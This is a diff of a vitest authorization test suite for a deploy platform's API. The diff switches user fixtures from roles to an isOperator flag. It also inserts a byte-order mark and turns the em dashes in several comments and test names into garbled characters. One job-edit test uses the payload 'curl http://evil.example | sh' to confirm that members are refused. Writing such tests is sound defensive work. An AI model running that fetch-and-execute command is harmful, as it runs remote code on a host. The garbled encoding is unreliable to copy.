@@ -1,4 +1,4 @@
-import { beforeEach, describe, expect, it, vi } from 'vitest';
+﻿import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { attachmentRoutes, databasesRoutes } from '../src/modules/databases.js';
 import { deploysRoutes } from '../src/modules/deploys.js';
 import { envRoutes } from '../src/modules/env.js';
@@ -58,7 +58,7 @@ vi.mock('../src/config.js', () => ({ config: configMock }));
 
 const MEMBER = 7;
 const OWNER = 42;
-/** A service owned by user 42 — the "other member" from user 7's perspective. */
+/** A service owned by user 42 â€” the "other member" from user 7's perspective. */
 const ownedByOther = svcRow({ id: 3, ownerUserId: OWNER, runtimeId: 'nd-svc-web' });
 
 beforeEach(() => {
@@ -76,7 +76,7 @@ describe('K2: service-scoped routes enforce ownership for members', () => {
     await app.register(webhookMgmtRoutes, { prefix: '/services' });
     await app.register(jobRoutes, { prefix: '/services' });
     // attachmentRoutes was missing here, so the /attachments case below was
-    // asserting Fastify's route-not-found 404 rather than the ownership 404 —
+    // asserting Fastify's route-not-found 404 rather than the ownership 404 â€”
     // it would have passed with the access check removed entirely.
     await app.register(attachmentRoutes, { prefix: '/services' });
     return app;
@@ -94,18 +94,18 @@ describe('K2: service-scoped routes enforce ownership for members', () => {
   ];
 
   for (const [label, method, url] of memberCases) {
-    it(`member is denied (404) on another member's service — ${label}`, async () => {
+    it(`member is denied (404) on another member's service â€” ${label}`, async () => {
       const app = await appWith();
-      const res = await app.inject({ method, url, headers: asUser({ id: MEMBER, role: 'member' }) });
+      const res = await app.inject({ method, url, headers: asUser({ id: MEMBER, isOperator: false }) });
       expect(res.statusCode, `${method} ${url} by non-owner member`).toBe(404);
     });
   }
 
   it('the owner member and admins can still access the same service', async () => {
     const app = await appWith();
-    const asOwner = await app.inject({ method: 'GET', url: '/services/3', headers: asUser({ id: OWNER, role: 'member' }) });
+    const asOwner = await app.inject({ method: 'GET', url: '/services/3', headers: asUser({ id: OWNER, isOperator: false }) });
     expect(asOwner.statusCode).toBe(200);
-    const asAdmin = await app.inject({ method: 'GET', url: '/services/3', headers: asUser({ id: 1, role: 'admin' }) });
+    const asAdmin = await app.inject({ method: 'GET', url: '/services/3', headers: asUser({ id: 1, isOperator: true }) });
     expect(asAdmin.statusCode).toBe(200);
   });
 
@@ -125,7 +125,7 @@ describe('K2: service-scoped routes enforce ownership for members', () => {
     const res = await app.inject({
       method: 'POST',
       url: '/services',
-      headers: asUser({ id: MEMBER, role: 'member' }),
+      headers: asUser({ id: MEMBER, isOperator: false }),
       payload: { name: 'Owned App', type: 'docker', repoUrl: 'https://x/y.git', branch: 'main', build: { buildPack: 'auto', baseDir: '/' } },
     });
     expect(res.statusCode).toBe(200);
@@ -145,9 +145,9 @@ describe('K2: service-scoped routes enforce ownership for members', () => {
       }),
     });
     await app.register(servicesRoutes, { prefix: '/services' });
-    const asMember = await app.inject({ method: 'GET', url: '/services', headers: asUser({ id: MEMBER, role: 'member' }) });
+    const asMember = await app.inject({ method: 'GET', url: '/services', headers: asUser({ id: MEMBER, isOperator: false }) });
     expect(asMember.statusCode).toBe(200);
-    const asAdmin = await app.inject({ method: 'GET', url: '/services', headers: asUser({ id: 1, role: 'admin' }) });
+    const asAdmin = await app.inject({ method: 'GET', url: '/services', headers: asUser({ id: 1, isOperator: true }) });
     expect(asAdmin.statusCode).toBe(200);
     expect(listArgs).toHaveLength(2);
     // The member's query is scoped (a drizzle where condition is present);
@@ -171,7 +171,7 @@ describe('jobs: editing an existing exec job stays admin-only (HIGH fix)', () =>
     const res = await app.inject({
       method: 'PATCH',
       url: '/services/3/jobs/11',
-      headers: asUser({ id: MEMBER, role: 'member' }),
+      headers: asUser({ id: MEMBER, isOperator: false }),
       payload: { command: 'curl http://evil.example | sh' },
     });
     expect(res.statusCode).toBe(403);
@@ -185,7 +185,7 @@ describe('K5: existingVolume must be a docker volume name', () => {
     return app.inject({
       method: 'POST',
       url: '/databases',
-      headers: asUser({ id: MEMBER, role: 'member' }),
+      headers: asUser({ id: MEMBER, isOperator: false }),
       payload: { name: 'Evil', engine: 'postgres', existingVolume: volume },
     });
   }
@@ -214,7 +214,7 @@ describe('K5: existingVolume must be a docker volume name', () => {
     const res = await app.inject({
       method: 'POST',
       url: '/databases',
-      headers: asUser({ id: MEMBER, role: 'member' }),
+      headers: asUser({ id: MEMBER, isOperator: false }),
       payload: { name: 'Evil', engine: 'postgres', existingVolume: 'nd-db-imported-data' },
     });
     expect(res.statusCode).toBe(200);
@@ -236,7 +236,7 @@ describe('K6: database credentials are admin-only', () => {
 
   it('the list omits the password-embedded connection string for members', async () => {
     const app = await dbApp();
-    const res = await app.inject({ method: 'GET', url: '/databases', headers: asUser({ id: MEMBER, role: 'member' }) });
+    const res = await app.inject({ method: 'GET', url: '/databases', headers: asUser({ id: MEMBER, isOperator: false }) });
     expect(res.statusCode).toBe(200);
     expect(res.json()[0]).toMatchObject({ connectionString: null });
     expect(JSON.stringify(res.body)).not.toContain('secret');
@@ -244,15 +244,15 @@ describe('K6: database credentials are admin-only', () => {
 
   it('admins still receive the connection string', async () => {
     const app = await dbApp();
-    const res = await app.inject({ method: 'GET', url: '/databases', headers: asUser({ id: 1, role: 'admin' }) });
+    const res = await app.inject({ method: 'GET', url: '/databases', headers: asUser({ id: 1, isOperator: true }) });
     expect(res.json()[0]).toMatchObject({ connectionString: 'postgres://nine:secret@nd-db-pg:5432/app' });
   });
 
   it('GET /databases/:id/credentials requires admin', async () => {
     const app = await dbApp();
-    const denied = await app.inject({ method: 'GET', url: '/databases/1/credentials', headers: asUser({ id: MEMBER, role: 'member' }) });
+    const denied = await app.inject({ method: 'GET', url: '/databases/1/credentials', headers: asUser({ id: MEMBER, isOperator: false }) });
     expect(denied.statusCode).toBe(403);
-    const allowed = await app.inject({ method: 'GET', url: '/databases/1/credentials', headers: asUser({ id: 1, role: 'admin' }) });
+    const allowed = await app.inject({ method: 'GET', url: '/databases/1/credentials', headers: asUser({ id: 1, isOperator: true }) });
     expect(allowed.statusCode).toBe(200);
     expect(allowed.json()).toMatchObject({ password: 'pw' });
   });
